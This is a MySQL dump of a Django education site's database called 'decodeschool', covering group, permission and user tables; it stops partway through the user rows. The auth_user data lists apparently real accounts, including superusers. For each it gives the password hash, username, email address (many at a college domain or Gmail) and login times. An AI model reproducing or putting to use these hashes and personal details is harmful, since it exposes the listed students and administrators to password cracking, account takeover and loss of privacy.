-- MySQL dump 10.13  Distrib 8.0.35, for Linux (x86_64)
--
-- Host: localhost    Database: decodeschool
-- ------------------------------------------------------
-- Server version	8.0.35-0ubuntu0.23.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `auth_group`
--

DROP TABLE IF EXISTS `auth_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_group` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(150) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group`
--

LOCK TABLES `auth_group` WRITE;
/*!40000 ALTER TABLE `auth_group` DISABLE KEYS */;
INSERT INTO `auth_group` VALUES (1,'coordinator');
/*!40000 ALTER TABLE `auth_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group_permissions`
--

DROP TABLE IF EXISTS `auth_group_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_group_permissions` (
  `id` int NOT NULL AUTO_INCREMENT,
  `group_id` int NOT NULL,
  `permission_id` int NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_group_permissions_group_id_permission_id_0cd325b0_uniq` (`group_id`,`permission_id`),
  KEY `auth_group_permissions_group_id_b120cbf9` (`group_id`),
  KEY `auth_group_permissions_permission_id_84c5c92e` (`permission_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group_permissions`
--

LOCK TABLES `auth_group_permissions` WRITE;
/*!40000 ALTER TABLE `auth_group_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_permission`
--

DROP TABLE IF EXISTS `auth_permission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_permission` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `content_type_id` int NOT NULL,
  `codename` varchar(100) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_permission_content_type_id_codename_01ab375a_uniq` (`content_type_id`,`codename`),
  KEY `auth_permission_content_type_id_2f476e4b` (`content_type_id`)
) ENGINE=MyISAM AUTO_INCREMENT=141 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_permission`
--

LOCK TABLES `auth_permission` WRITE;
/*!40000 ALTER TABLE `auth_permission` DISABLE KEYS */;
INSERT INTO `auth_permission` VALUES (1,'Can add log entry',1,'add_logentry'),(2,'Can change log entry',1,'change_logentry'),(3,'Can delete log entry',1,'delete_logentry'),(4,'Can view log entry',1,'view_logentry'),(5,'Can add permission',4,'add_permission'),(6,'Can change permission',4,'change_permission'),(7,'Can delete permission',4,'delete_permission'),(8,'Can view permission',4,'view_permission'),(9,'Can add user',2,'add_user'),(10,'Can change user',2,'change_user'),(11,'Can delete user',2,'delete_user'),(12,'Can view user',2,'view_user'),(13,'Can add group',3,'add_group'),(14,'Can change group',3,'change_group'),(15,'Can delete group',3,'delete_group'),(16,'Can view group',3,'view_group'),(17,'Can add content type',5,'add_contenttype'),(18,'Can change content type',5,'change_contenttype'),(19,'Can delete content type',5,'delete_contenttype'),(20,'Can view content type',5,'view_contenttype'),(21,'Can add session',6,'add_session'),(22,'Can change session',6,'change_session'),(23,'Can delete session',6,'delete_session'),(24,'Can view session',6,'view_session'),(25,'Can add chapter',12,'add_chapter'),(26,'Can change chapter',12,'change_chapter'),(27,'Can delete chapter',12,'delete_chapter'),(28,'Can view chapter',12,'view_chapter'),(29,'Can add program',7,'add_program'),(30,'Can change program',7,'change_program'),(31,'Can delete program',7,'delete_program'),(32,'Can view program',7,'view_program'),(33,'Can add comment',11,'add_comment'),(34,'Can change comment',11,'change_comment'),(35,'Can delete comment',11,'delete_comment'),(36,'Can view comment',11,'view_comment'),(37,'Can add blog',10,'add_blog'),(38,'Can change blog',10,'change_blog'),(39,'Can delete blog',10,'delete_blog'),(40,'Can view blog',10,'view_blog'),(41,'Can add post',9,'add_post'),(42,'Can change post',9,'change_post'),(43,'Can delete post',9,'delete_post'),(44,'Can view post',9,'view_post'),(45,'Can add course',8,'add_course'),(46,'Can change course',8,'change_course'),(47,'Can delete course',8,'delete_course'),(48,'Can view course',8,'view_course'),(49,'Can add attachment',13,'add_attachment'),(50,'Can change attachment',13,'change_attachment'),(51,'Can delete attachment',13,'delete_attachment'),(52,'Can view attachment',13,'view_attachment'),(53,'Can add site',14,'add_site'),(54,'Can change site',14,'change_site'),(55,'Can delete site',14,'delete_site'),(56,'Can view site',14,'view_site'),(57,'Can add kv store',15,'add_kvstore'),(58,'Can change kv store',15,'change_kvstore'),(59,'Can delete kv store',15,'delete_kvstore'),(60,'Can view kv store',15,'view_kvstore'),(61,'Can add submission',19,'add_submission'),(62,'Can change submission',19,'change_submission'),(63,'Can delete submission',19,'delete_submission'),(64,'Can view submission',19,'view_submission'),(65,'Can add newsletter',18,'add_newsletter'),(66,'Can change newsletter',18,'change_newsletter'),(67,'Can delete newsletter',18,'delete_newsletter'),(68,'Can view newsletter',18,'view_newsletter'),(69,'Can add article',20,'add_article'),(70,'Can change article',20,'change_article'),(71,'Can delete article',20,'delete_article'),(72,'Can view article',20,'view_article'),(73,'Can add subscription',17,'add_subscription'),(74,'Can change subscription',17,'change_subscription'),(75,'Can delete subscription',17,'delete_subscription'),(76,'Can view subscription',17,'view_subscription'),(77,'Can add message',16,'add_message'),(78,'Can change message',16,'change_message'),(79,'Can delete message',16,'delete_message'),(80,'Can view message',16,'view_message'),(81,'Can add industry',21,'add_industry'),(82,'Can change industry',21,'change_industry'),(83,'Can delete industry',21,'delete_industry'),(84,'Can view industry',21,'view_industry'),(85,'Can add course',22,'add_course'),(86,'Can change course',22,'change_course'),(87,'Can delete course',22,'delete_course'),(88,'Can view course',22,'view_course'),(89,'Can add visitor',23,'add_visitor'),(90,'Can change visitor',23,'change_visitor'),(91,'Can delete visitor',23,'delete_visitor'),(92,'Can view visitor',23,'view_visitor'),(93,'Can add batch',25,'add_batch'),(94,'Can change batch',25,'change_batch'),(95,'Can delete batch',25,'delete_batch'),(96,'Can view batch',25,'view_batch'),(97,'Can add department',26,'add_department'),(98,'Can change department',26,'change_department'),(99,'Can delete department',26,'delete_department'),(100,'Can view department',26,'view_department'),(101,'Can add institution',27,'add_institution'),(102,'Can change institution',27,'change_institution'),(103,'Can delete institution',27,'delete_institution'),(104,'Can view institution',27,'view_institution'),(105,'Can add platform',28,'add_platform'),(106,'Can change platform',28,'change_platform'),(107,'Can delete platform',28,'delete_platform'),(108,'Can view platform',28,'view_platform'),(109,'Can add problem',29,'add_problem'),(110,'Can change problem',29,'change_problem'),(111,'Can delete problem',29,'delete_problem'),(112,'Can view problem',29,'view_problem'),(113,'Can add user_ handle',30,'add_user_handle'),(114,'Can change user_ handle',30,'change_user_handle'),(115,'Can delete user_ handle',30,'delete_user_handle'),(116,'Can view user_ handle',30,'view_user_handle'),(117,'Can add solved_ problem',31,'add_solved_problem'),(118,'Can change solved_ problem',31,'change_solved_problem'),(119,'Can delete solved_ problem',31,'delete_solved_problem'),(120,'Can view solved_ problem',31,'view_solved_problem'),(121,'Can add profile',32,'add_profile'),(122,'Can change profile',32,'change_profile'),(123,'Can delete profile',32,'delete_profile'),(124,'Can view profile',32,'view_profile'),(125,'Can add problem tags',33,'add_problemtags'),(126,'Can change problem tags',33,'change_problemtags'),(127,'Can delete problem tags',33,'delete_problemtags'),(128,'Can view problem tags',33,'view_problemtags'),(129,'Can add assignment',34,'add_assignment'),(130,'Can change assignment',34,'change_assignment'),(131,'Can delete assignment',34,'delete_assignment'),(132,'Can view assignment',34,'view_assignment'),(133,'Can add assignment_ problems',35,'add_assignment_problems'),(134,'Can change assignment_ problems',35,'change_assignment_problems'),(135,'Can delete assignment_ problems',35,'delete_assignment_problems'),(136,'Can view assignment_ problems',35,'view_assignment_problems'),(137,'Can add course',36,'add_course'),(138,'Can change course',36,'change_course'),(139,'Can delete course',36,'delete_course'),(140,'Can view course',36,'view_course');
/*!40000 ALTER TABLE `auth_permission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user`
--

DROP TABLE IF EXISTS `auth_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `auth_user` (
  `id` int NOT NULL AUTO_INCREMENT,
  `password` varchar(128) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `last_login` datetime(6) DEFAULT NULL,
  `is_superuser` tinyint(1) NOT NULL,
  `username` varchar(150) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `first_name` varchar(150) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `last_name` varchar(150) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `email` varchar(254) CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci NOT NULL,
  `is_staff` tinyint(1) NOT NULL,
  `is_active` tinyint(1) NOT NULL,
  `date_joined` datetime(6) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=MyISAM AUTO_INCREMENT=392 DEFAULT CHARSET=utf8mb3 COLLATE=utf8mb3_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user`
--

LOCK TABLES `auth_user` WRITE;
/*!40000 ALTER TABLE `auth_user` DISABLE KEYS */;
INSERT INTO `auth_user` VALUES (1,'pbkdf2_sha256$150000$ieBAI5YchfyO$8+0ecG/q13E0I5b6u5gCt5CLqFZLGha+s2oKcFauCFk=','2020-06-06 10:36:02.547389',1,'admin','','','',1,1,'2020-05-30 13:29:59.140391'),(2,'pbkdf2_sha256$720000$CervleETXjNfTGhcEzmgK2$kVQxqQ1CBBsyjQKFA6IUbf+z7fu4P0lH0xSjF/2hpi8=','2025-03-24 06:07:25.786363',1,'decoder','','','admin@decodeschool.com',1,1,'2020-09-17 04:29:10.000000'),(3,'pbkdf2_sha256$600000$NvReLbENox6pej8AWPU1Ju$52ZUUprLIwWjUwEnXI9bpBG9dDkc3cIIAaXbx1KeuEI=','2024-02-13 07:39:33.904764',0,'pnr','Ramesh','P N','',0,1,'2021-01-05 08:23:15.000000'),(4,'pbkdf2_sha256$260000$7uUBr39NJjca8lzF37GnTd$18PyjfVaRIq+cZV6iFcQz5mQSobu0ntu9MgrY9fok+A=','2022-07-27 06:16:03.895181',0,'karthi','','','',0,1,'2022-07-27 06:16:03.501079'),(5,'pbkdf2_sha256$260000$Ps5TfHJXssqS7UGT6Ehtlf$hhPBqDRmiOnoy4DvFhFjVYLKhEELp4bypHOFpOth/Ro=','2022-07-27 12:22:21.063290',0,'test@test.com','','','',0,1,'2022-07-27 12:22:20.520887'),(6,'pbkdf2_sha256$260000$PdYwTcH3ODTLeaT38rBCwJ$s32PTsk4aimEBLYv6SPF7NiZpwbSi0Ah7+Pf4x92GOU=','2022-07-27 19:52:59.110617',0,'prashant_if22','','','',0,1,'2022-07-27 19:52:58.714614'),(7,'pbkdf2_sha256$260000$H77YcORQauKSUPI5CuOmk7$boLfADliDf9rulj+wP6U0e4wtxKzpkBHVZgtn/5gWdo=','2022-07-28 11:16:02.647552',0,'santhoshokk','','','',0,1,'2022-07-28 11:16:02.241653'),(8,'pbkdf2_sha256$260000$0b4IhbtKEO6aQo2aWhO0Ws$RuBcakI+q9M7iF8rm9MNz+MOdQImct0GMBs5qvlpZeQ=','2022-07-28 11:16:41.389084',0,'itvijay2001','','','',0,1,'2022-07-28 11:16:40.833671'),(9,'pbkdf2_sha256$260000$wX9slemMBGK5yaH8I6a6yY$Q0T8Ye2MKUrep3pOa4yB7VeXgj/VAGG5GFXOoWIUUvs=','2022-07-28 11:17:20.069464',0,'srikanth2002','','','',0,1,'2022-07-28 11:17:19.591219'),(10,'pbkdf2_sha256$260000$jKUy9xKJj9qSNdp6qldEfg$W82x8IGcZ+BNhEPo6QnDt6BvEK61nkqt/qa5xFnyL0k=','2022-07-28 11:17:34.829574',0,'rithik','','','',0,1,'2022-07-28 11:17:34.415651'),(11,'pbkdf2_sha256$260000$mxtxj9hk0JNanJ99UtiBQt$JkFw2EjVPpAfZGDK6+5w8tP/XjPBB3+wJlq8LB66qJw=','2022-07-28 11:17:56.550186',0,'Tharun19','','','',0,1,'2022-07-28 11:17:56.141986'),(12,'pbkdf2_sha256$260000$GnJUQ5geAPmJL0lvwNy7WB$MVurHPHN3ayd3vuWT+5rj0mc9q70QQm/EE7eNUBWFx0=','2022-07-28 11:18:23.673986',0,'Manojmk18','','','',0,1,'2022-07-28 11:18:23.259896'),(13,'pbkdf2_sha256$260000$2CDbFo5f9MezntpbjOp4av$PQDVifAx6APbUoqU8JNtkh1E8KVBvveO2rWYIICNf6A=','2022-07-28 11:18:25.890636',0,'Sanjaykumar','','','',0,1,'2022-07-28 11:18:25.480666'),(14,'pbkdf2_sha256$260000$RdJeCCpjHigFfwMS7V5vlj$dCz1hzpj8xz6uQ+cwfy/EfcA7cGEtjcREzplSC7nwuk=','2022-07-28 11:18:30.196661',0,'19csa39@karpagamtech.ac.in','','','',0,1,'2022-07-28 11:18:29.703437'),(15,'pbkdf2_sha256$260000$kI93hUcebp4cdZNATcbpQg$vzG90Th++/iLgjZT1M7qIQ8+CRPOYhCICDActMRY88w=','2022-07-28 11:18:52.115758',0,'SivadhanushT','','','',0,1,'2022-07-28 11:18:51.721371'),(16,'pbkdf2_sha256$260000$SnUSwx3tbA99wdYBP9fQDl$lFR2jr3gh2NCLhHT2gxG+ZeZ8lMuMs4pgK5mbD8Czg0=','2022-07-28 11:19:04.954414',0,'19ita49@karpagamtech.ac.in','','','',0,1,'2022-07-28 11:19:04.552569'),(17,'pbkdf2_sha256$260000$KbtBMjGNZYkCFlmYhwz9NR$R1w6VeG+HbM8QTzVKjidgWX0rF5HRSdt+ETeyL/FRsY=','2022-07-28 11:19:19.430066',0,'19ita51@karpagamtech.ac.in','','','',0,1,'2022-07-28 11:19:18.973501'),(18,'pbkdf2_sha256$260000$b8A8kSRJeHdSXPyreel00t$MXwbAdWycwBtiOZ+Vb0YJ7i4ejv0ziONMAOjXEYkKRs=','2022-07-28 11:19:24.161231',0,'19eca30@karpagamtech.ac.in','','','',0,1,'2022-07-28 11:19:23.722464'),(19,'pbkdf2_sha256$260000$i9jYH7ies0G2QCwu2TBnpE$EStC90PQnPlDgEYG++uZROdK9DySbfr2jhsktbqwyUs=','2022-07-28 11:19:26.717142',0,'19ita47@karpagamtech.ac.in','','','',0,1,'2022-07-28 11:19:26.293715'),(20,'pbkdf2_sha256$260000$mHJd0sx9P31kOP9gJPS9sC$f+79zBkZi21R1z7CoT2nKnsEyCLdMPmQcPuZYPykM5Y=','2022-07-28 11:19:42.922153',0,'19eca51@karpagamtech.ac.in','','','',0,1,'2022-07-28 11:19:42.499799'),(21,'pbkdf2_sha256$260000$IBL4whV5ujjprkirTdjypJ$NKo4RaxP/zfi8LZOiANxp62L/cRoIIS3yEB8UvUmChQ=','2022-07-28 11:19:53.229864',0,'nisha_3','','','',0,1,'2022-07-28 11:19:52.824485'),(22,'pbkdf2_sha256$260000$8QaSMw6EQciBvDIfQYkKke$VgF2R00kp9K2mnPotJKb9BFIsSL4YRCI2IS5zgBoFwo=','2022-07-28 11:20:34.005577',0,'NANDHAKUMAR@2002','','','',0,1,'2022-07-28 11:20:33.617081'),(23,'pbkdf2_sha256$260000$MvTAsaPTVcsKpO5U4taXwg$Gv+zHTESOxXlZMZ7AG7cdK9V8s2rvXCt+NLMS3XqZls=','2022-07-28 11:20:37.424867',0,'NAVEEN@03012000','','','',0,1,'2022-07-28 11:20:37.017550'),(24,'pbkdf2_sha256$260000$Q9od4Kn1A1UsgdSqEt5hDP$YVrUocwFs1l4zSXswKBncpH9FZdOrsffdI0C498tQzw=','2022-07-28 11:20:54.813280',0,'AJAY','','','',0,1,'2022-07-28 11:20:54.370308'),(25,'pbkdf2_sha256$260000$ElCVgg8ITBhnKgI7Ne6Mnp$94wANd5EBXr1CLeeXgAsXEQdQh+GxmNZI+aIg+jrhFo=','2022-07-28 11:20:56.419397',0,'rakshi_12','','','',0,1,'2022-07-28 11:20:56.034345'),(26,'pbkdf2_sha256$260000$OucMMmVew77stRolTl2JrU$6j+Cz+70hKYjeuDFhthFX7tmnw2KqOxOzzoM/RfvzHk=','2022-07-28 11:21:21.320397',0,'kiruba','','','',0,1,'2022-07-28 11:21:20.881610'),(27,'pbkdf2_sha256$260000$SBrKjfwDfw7LuwrVbtMN53$EIMi+mtMXyaWxLxDFHnrhWiQbhKsrQv0Q7CLvBUVrnM=','2022-07-28 11:21:22.003733',0,'SanjaiR','','','',0,1,'2022-07-28 11:21:21.521264'),(28,'pbkdf2_sha256$260000$MDp9cOtSaJnFmKZ40VEgxo$3uXBadRUQlEJeHg+eYP746KdSWDRuYLd8eadDZDQh/I=','2022-07-28 11:22:17.566994',0,'janani@10','','','',0,1,'2022-07-28 11:22:17.086743'),(29,'pbkdf2_sha256$260000$yhj4HCdPDFeewmHNaoYUQw$lWZDCeAbimaIehnG/AO8hurHZNPOWWjL1cgCzgDGyos=','2022-07-28 11:23:41.115621',0,'19eca50@karpagamtech.ac.in','','','',0,1,'2022-07-28 11:23:40.711542'),(30,'pbkdf2_sha256$260000$kKth5qVoGOMhBWSWYp1jz6$kI1ioVkEr6/QTxHmZoNKEusBHpkDS80/eFgQ1LffTQg=','2022-07-28 11:25:22.780098',0,'praveenM1522','','','',0,1,'2022-07-28 11:25:22.365511'),(31,'pbkdf2_sha256$260000$dQQI0anIT8iBkTjpwxcQvn$eKGUaGFmsO06n3aLzcezrQJGWkW2Eh+btE2qqu7aVpo=','2022-07-28 11:25:42.919801',0,'Kalpanadevi@11','','','',0,1,'2022-07-28 11:25:42.527214'),(32,'pbkdf2_sha256$260000$d9aDOgTpluRgOCitdjZBDJ$2DVrKHUpbJqLV3zE062J2XWK8vkc/kRp66gBeVqVu0c=','2022-07-28 11:28:05.509181',0,'nandhini@25','','','',0,1,'2022-07-28 11:28:05.099735'),(33,'pbkdf2_sha256$260000$eHYSlrzyjI2BEO3pbM6M4E$j37+z21MWqZPxoWsb0E6IoIAqXkNfEO9+0EAFMyshBs=','2022-07-28 11:28:07.589000',0,'19mea05@karpagamtech.ac.in','','','',0,1,'2022-07-28 11:28:07.199058'),(34,'pbkdf2_sha256$260000$nQVK4RMOiZwWfZ9sbv3JK7$ZlWVhflpWQnKXIfIlkEQ2L094mPgVW539LEIZfWOsOk=','2022-07-28 11:29:05.226232',0,'Gowri','','','',0,1,'2022-07-28 11:29:04.801600'),(35,'pbkdf2_sha256$260000$qTwnGHdgwiKJbThDs5IaHR$ezL3pmMCyKkAaI5JwPkzp4ftgzq5z+f6wtI0SGj/Yag=','2022-07-28 11:29:32.322246',0,'19eca52','','','',0,1,'2022-07-28 11:29:31.915859'),(36,'pbkdf2_sha256$260000$bJlU7rFyS56EXzPzi4KrOo$ZzDkXI+ZSjeMGImh7o9MgYmh83ibUdwJyJbvnvgP3Zk=','2022-07-28 11:29:47.298311',0,'SreeSushanth66','','','',0,1,'2022-07-28 11:29:46.891749'),(37,'pbkdf2_sha256$260000$pt9EDZFRToHiLm1SIpVrwU$ISzmQX6S+sDh+00bxjHjSS4vAqEsHcmo1aHgD4BBMGw=','2022-07-28 11:31:25.803549',0,'vibitha.s','','','',0,1,'2022-07-28 11:31:25.384051'),(38,'pbkdf2_sha256$260000$bGs4AsQfNEU3uYkg7vCm7w$nAZNHr+gzGQlyQomHIZSGPbSGDZ8Yu3HnjKdHKwJ1Ek=','2022-07-28 11:35:13.706141',0,'Kishore.R','','','',0,1,'2022-07-28 11:35:13.224662'),(39,'pbkdf2_sha256$260000$sN1t7jJY1Y4vQRVGxKLVoq$HHgJvi4EAXrx+9EbP9H9PNvWXSs6p232gC2akp1FSYs=','2022-07-28 11:57:31.127822',0,'Swaminathan','','','',0,1,'2022-07-28 11:57:30.730809'),(40,'pbkdf2_sha256$260000$yOQdFBp9z5fJmpyUD6ffEX$SNrxVCl8iraosqSUIEd1xJnoe6OP0kwezHrtfmntoOE=','2022-08-03 02:54:42.038744',0,'SadafBanu','','','',0,1,'2022-08-03 02:54:41.629195'),(41,'pbkdf2_sha256$260000$hsIZCIsfhqba4beSnd6gy0$a8o5g1Qo/P/qTtjxGd5/zybS6HsHDbLAQJ70I9N1t/4=','2022-08-16 16:08:09.734251',0,'shreya','','','',0,1,'2022-08-16 16:08:09.311537'),(42,'pbkdf2_sha256$260000$XMHwDMymbluluBjfUYO1Zj$11mTHbTCG4M3pgry1DLJNC6jfqB78GTdXryF4QvOJvw=','2022-08-19 07:18:31.282086',0,'himanshu@2001','','','',0,1,'2022-08-19 07:18:30.859428'),(43,'pbkdf2_sha256$260000$SYlS2RsXm8CTqOtodERYyV$eNmFsW6T8FzUr/yfxy3PI7oYulS1O6KU9kDv4Woryyw=','2022-08-25 01:08:10.340870',0,'Arasi@2010','','','',0,1,'2022-08-25 01:08:09.945377'),(44,'pbkdf2_sha256$260000$m0K2870DAMopkZjd0XT289$XBR/WHurlbEoGId7d5PGySAtvh/rhZ9ku/NsdAVV5PM=','2022-09-02 05:16:21.723979',0,'Keerthana','','','',0,1,'2022-09-02 05:16:21.293950'),(45,'pbkdf2_sha256$260000$Ni5t2LQ8n9UEi5JeUnLQzs$OzaeTlUp/Ln5JJvX1J/ESIhixyjBfYPPEL/ev5ThD5Y=','2022-09-10 05:53:58.871449',0,'karishma','','','',0,1,'2022-09-10 05:53:58.425360'),(46,'pbkdf2_sha256$260000$PH0pL8s8IOWhCtnmd30Vwj$mQLtslO26w8SBeAbnCA74p8Fnmp8DYULItObGKml/Dc=','2022-09-12 23:08:28.926211',0,'Blessing','','','',0,1,'2022-09-12 23:08:28.368949'),(83,'pbkdf2_sha256$260000$2VCYjG6tPH9dkrfTpYEemD$4fw9u0Oxpfv0xYSQ4SyQpghvd/be3E9dW8YR1rqTsbw=','2023-02-10 14:40:10.068320',0,'mohan52911','','','',0,1,'2023-02-10 14:40:09.742386'),(48,'pbkdf2_sha256$260000$qT88StvgJYhgNMAQmQBnPy$W5sLoKLHkB0NA5smCFtj1grzNgSFsyDZMvLlPm/ysEk=','2022-09-22 08:58:31.485373',0,'nicanorkyamba','','','',0,1,'2022-09-22 08:58:30.963556'),(49,'pbkdf2_sha256$260000$E1V02YczBo2lTSckvTeRds$CgjiKe3S9gUSR81+8X7srTU5DGfhNwEVUc335pwUaZs=','2022-09-26 13:53:16.807437',0,'anunj2000','','','',0,1,'2022-09-26 13:53:16.149747'),(50,'pbkdf2_sha256$260000$0Y6TAcEklRlMLXBgCyEYDC$qGU3rajkxD5SA48+XgyK6ReUqmml6UuqQwFFBOolBBY=','2022-10-03 17:47:01.497680',0,'arsematebikgn@gmail.com','','','',0,1,'2022-10-03 17:47:00.726725'),(51,'pbkdf2_sha256$260000$fK7zsxhl6ox6pb1y5grSOi$n/jdT7t3TVMb3vOKq9zzTjz9s1wytIF9i0cAcIxPfUk=','2022-10-20 06:09:40.370925',0,'jaidevdileep@gmail.com','','','',0,1,'2022-10-20 06:09:39.990391'),(52,'pbkdf2_sha256$260000$Tpo8ajFLbQVpyT4eJx12P4$EuJzoalNBhY1NsfatKJNwoLTmK0XRHzji4R9oJad9/M=','2022-10-29 05:28:44.628646',0,'Madina.Kavya','','','',0,1,'2022-10-29 05:28:44.272960'),(53,'pbkdf2_sha256$260000$2yJ6k4PzRhPtC5NwvnxYi9$fGQ8C3sh4IyNnyts/QJjYg/M/V1ChKTyu8IuvDGz2Pw=','2022-11-01 15:01:11.544709',0,'phanindrakumar534@gmail.com','','','',0,1,'2022-11-01 15:01:11.137612'),(54,'pbkdf2_sha256$260000$1Y9B4lDXLDZVeCxR2JegXd$GGykQMrjdv5Evcbh/DyYrrHuEC/pfkcu+nfqC/Rm4Hc=','2022-11-03 12:52:06.543061',0,'akameson17@gmail.com','','','',0,1,'2022-11-03 12:52:05.987697'),(88,'pbkdf2_sha256$260000$Q2rG8U5EaMbOY8DCz1qP34$Lb525It+jxMNZ1b6koeAnC+EE+mQFWnLyT2QxyBX1GE=','2023-02-21 19:59:39.516082',0,'Bravopcorih','','','',0,1,'2023-02-21 19:59:39.194802'),(56,'pbkdf2_sha256$260000$zJyuwqVGzegv9aQF2Qh4Id$L033Ky5d4cxbJss20r4+bltVgkR4SbNP5BKvw/obL0g=','2022-11-19 09:15:15.657922',0,'Adoni','','','',0,1,'2022-11-19 09:15:15.292521'),(87,'pbkdf2_sha256$260000$G6Vfj4sltsdnbYhiaU6sDE$tb3UfW4RB29aeScRxhJcTkEHfOQPbtFJxArQtQhSgag=','2023-02-16 03:53:58.926165',0,'Samantha','','','',0,1,'2023-02-16 03:53:58.600805'),(59,'pbkdf2_sha256$260000$cM0Miy5U8PZbvDRKlnFsEh$bUJgOgyLLnQQ85sZTQi/m7wgFdCiHPcXweGniAqXFjI=','2022-12-07 08:05:50.236655',0,'prasadshinde11298@gmail.com','','','',0,1,'2022-12-07 08:05:49.902706'),(60,'pbkdf2_sha256$260000$7bKmXshz6yUEcT560XkqlL$GcRe25Xgt1qVEHKU1M5TA/D2CxCsgVOV6Gyjb2KbKC4=','2022-12-13 05:29:39.726654',0,'pradeep_reddy_07','','','',0,1,'2022-12-13 05:28:18.091914'),(61,'pbkdf2_sha256$260000$aHpMPgfPzlC8tpQu3m717j$EKsAJbePzB3GYyiJ5e7bPd49WT5LRD0bskrHP4LkOSw=','2022-12-13 10:50:44.151440',0,'Narendra','','','',0,1,'2022-12-13 10:50:43.799848'),(62,'pbkdf2_sha256$260000$xFUp86HwWa4ppq3x9ekBND$smOSIjUVGg9AuFQIfKCG+2hvY+KOT0UxcwYrUJTV3rE=','2022-12-15 16:39:21.830913',0,'lekha.it08@gmail.com','','','',0,1,'2022-12-15 16:39:21.508563'),(63,'pbkdf2_sha256$720000$Y6frWKYrnhe65pGQcXHana$BUQpjPsNEdMy3KBWc2zrzpAdFu/KVd1v4FBX86OJduY=','2022-12-16 08:39:00.267192',0,'decodeschool','','','',0,1,'2022-12-16 08:38:59.938172'),(64,'pbkdf2_sha256$260000$Z5rFiO9KgfBCg0prDzpWeJ$rw6BPuogKzy7PxY0UyWOBO+gAIsvbClD4Rz3j5Ripbk=','2022-12-16 13:42:29.128023',0,'Firoj','','','',0,1,'2022-12-16 13:42:28.788933'),(65,'pbkdf2_sha256$260000$exYdkFNApYKPo8C64q4JSw$goQy27STh68fOMKDhu8C4AI5x2Y4JYWDejyxbRactwc=','2022-12-24 14:00:35.198088',0,'johnvijaypampana123@gmail.com','','','',0,1,'2022-12-24 14:00:34.878390'),(66,'pbkdf2_sha256$260000$0vqZHES12vUy9HZZY0f7yI$nVyRkb627PPh7fvpOTOa25X91EBuSr0J4+iNBxYunvM=','2022-12-24 21:58:04.287779',0,'debrabrooks','','','',0,1,'2022-12-24 21:50:23.447280'),(67,'pbkdf2_sha256$260000$BYY16q5Lx7uiFJxixE8kou$OxRaz1QFNSgruvzFY9nla1VwJt1LBhcyy4qt+9heMqk=','2022-12-25 06:43:56.592866',0,'eric91','','','',0,1,'2022-12-25 05:14:53.706600'),(68,'pbkdf2_sha256$260000$dsIa0OI9Zj6vEMmm21VoC2$D0JIdVn8zpR+npq6oiDk/Yt4uC2dpiZY1WXAOAIhuZM=','2023-01-06 22:10:43.827347',0,'liam','','','',0,1,'2023-01-06 22:10:43.502914'),(80,'pbkdf2_sha256$260000$5lVnyV01YrKXcvkJBU9Stc$crP0kPFkLX5SAOJdQNgmqcLqSafjPDGMNvjdvO3SLKI=','2023-02-07 12:55:36.085873',0,'devan@14','','','',0,1,'2023-02-07 12:55:35.760290'),(81,'pbkdf2_sha256$260000$ca4OQQhKRZLZfscG3zXjUw$6DlrKJXDlBzkDjMV4U4x5PlrTD42vUOiJEoHAG5MmmU=','2023-02-07 